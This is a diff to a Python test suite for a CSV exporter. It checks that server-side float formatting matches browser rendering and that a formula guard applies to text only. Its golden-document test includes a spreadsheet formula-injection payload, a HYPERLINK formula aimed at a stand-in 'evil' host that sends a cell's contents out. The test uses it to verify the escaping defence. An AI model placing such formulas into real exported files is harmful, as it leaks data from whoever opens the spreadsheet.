@@ -167,29 +167,80 @@ class TestCsvWriterParity:
         assert csv_cell("-IF(1,2,3)") == "'-IF(1,2,3)"
         assert csv_cell("-") == "'-"  # a lone lead character is not a number
 
+    # A FloatField is the one value type the two export layers can disagree on
+    # WITHOUT either side looking broken: DRF puts a float in the JSON body, the
+    # browser parses it and `String()`s it for layer 1, while layer 2 formats it
+    # in Python. Every row below is the ECMAScript rendering (verified with
+    # node's String()), pinned again by FLOAT_PARITY in
+    # app/src/lib/__tests__/csv.test.ts, so a drift on either side names itself.
+    FLOAT_PARITY = [
+        (0.0, "0"),
+        (-0.0, "0"),  # String(-0) is "0", not "-0"
+        (1.0, "1"),  # str(1.0) is "1.0" — the commonest divergence
+        (100.0, "100"),
+        (1e6, "1000000"),
+        (19.99, "19.99"),
+        (48.5, "48.5"),
+        (0.5, "0.5"),
+        (1 / 3, "0.3333333333333333"),
+        (0.1 + 0.2, "0.30000000000000004"),  # shortest round trip, both sides
+        (1e-5, "0.00001"),  # Python reprs this as 1e-05
+        (1e-6, "0.000001"),
+        (1e-7, "1e-7"),  # Python pads the exponent: 1e-07
+        (-1e-9, "-1e-9"),
+        (2.5e-13, "2.5e-13"),
+        (1e16, "10000000000000000"),
+        (1e17, "100000000000000000"),  # Python switches to 1e+17
+        (1e20, "100000000000000000000"),
+        (1e21, "1e+21"),
+        (6.02e23, "6.02e+23"),
+        (1e100, "1e+100"),
+        (1.7976931348623157e308, "1.7976931348623157e+308"),
+        (5e-324, "5e-324"),
+        (123456789012345680000.0, "123456789012345680000"),
+        (-0.00042, "-0.00042"),
+    ]
+
+    @pytest.mark.parametrize("value,expected", FLOAT_PARITY)
+    def test_float_is_rendered_the_way_the_client_renders_it(self, value, expected):
+        assert csv_cell(value) == expected
+
+    @pytest.mark.parametrize("value,expected", FLOAT_PARITY)
+    def test_floats_are_never_formula_guarded(self, value, expected):
+        """The guard is for TEXT (csv_export's own docstring says so).
+
+        A negative float in exponent form ("-1e-9") is not numeric-shaped, so a
+        guard keyed on the rendered text alone apostrophises server-side what
+        the browser leaves bare — a second divergence hiding behind the first.
+        """
+        assert not expected.startswith("'")
+        assert csv_cell(value) == expected
+
     def test_the_shared_golden_document(self):
         """One document, asserted twice: here and in csv.test.ts.
 
         Values were chosen to force every quoting/guard branch at once (int,
         padded-free text, comma text, embedded quote, embedded newline, bool,
         NULL, positive and negative Decimal, numeric-shaped STRING, formula
-        payload, datetime as object and as text). The literal below was produced
-        by this writer and is reproduced byte for byte by buildCsv(); if either
-        side drifts, exactly one of the two suites goes red and names the layer.
+        payload, datetime as object and as text, and three floats whose Python
+        `str()` forms are NOT what a browser writes for the same JSON number).
+        The literal below was produced by this writer and is reproduced byte
+        for byte by buildCsv(); if either side drifts, exactly one of the two
+        suites goes red and names the layer.
         """
-        header = ["id", "name", "notes", "active", "total", "when"]
+        header = ["id", "name", "notes", "active", "total", "when", "weight"]
         rows = [
-            [1, "Widget", "plain", True, Decimal("19.99"), datetime(2026, 10, 20, 21, 0)],
-            [2, "Gizmo, big", 'say "hi"', False, Decimal("-5.00"), None],
+            [1, "Widget", "plain", True, Decimal("19.99"), datetime(2026, 10, 20, 21, 0), 1.0],
+            [2, "Gizmo, big", 'say "hi"', False, Decimal("-5.00"), None, -0.5],
             [3, "line1\nline2", '=HYPERLINK("http://evil/"+A1)', True, "-7.25",
-             "2026-10-20T21:00:00"],
+             "2026-10-20T21:00:00", 1e-7],
         ]
         assert csv_text([header] + [[csv_cell(v) for v in row] for row in rows]) == (
-            "id,name,notes,active,total,when\r\n"
-            "1,Widget,plain,true,19.99,2026-10-20T21:00:00\r\n"
-            '2,"Gizmo, big","say ""hi""",false,-5.00,\r\n'
+            "id,name,notes,active,total,when,weight\r\n"
+            "1,Widget,plain,true,19.99,2026-10-20T21:00:00,1\r\n"
+            '2,"Gizmo, big","say ""hi""",false,-5.00,,-0.5\r\n'
             "3,\"line1\nline2\",\"'=HYPERLINK(\"\"http://evil/\"\"+A1)\","
-            "true,-7.25,2026-10-20T21:00:00\r\n"
+            "true,-7.25,2026-10-20T21:00:00,1e-7\r\n"
         )
 
 
